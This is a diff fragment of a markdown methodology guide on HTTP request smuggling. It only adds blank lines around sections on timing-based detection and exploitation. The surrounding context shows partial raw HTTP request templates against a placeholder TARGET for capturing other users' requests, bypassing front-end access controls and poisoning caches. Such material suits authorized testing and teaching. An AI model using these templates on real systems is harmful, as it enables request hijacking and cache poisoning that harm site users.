@@ -49,6 +49,7 @@ SMUGGLED
 ### Phase 2: Timing-Based Detection
 
 Send ambiguous request, measure response time:
+
 - If back-end times out waiting for more data → smuggling may be possible
 
 ```bash
@@ -77,6 +78,7 @@ If next request to `/` returns 404 or different page, smuggling is confirmed.
 ### Phase 4: Exploitation
 
 **Capture other user's request:**
+
 ```http
 POST / HTTP/1.1
 Host: TARGET
@@ -91,9 +93,11 @@ Content-Type: application/x-www-form-urlencoded
 
 data=
 ```
+
 Next user's request is appended to `data=` parameter.
 
 **Bypass front-end access controls:**
+
 ```http
 POST / HTTP/1.1
 Host: TARGET
@@ -108,6 +112,7 @@ X: x
 ```
 
 **Cache poisoning via smuggling:**
+
 ```http
 POST / HTTP/1.1
 Host: TARGET
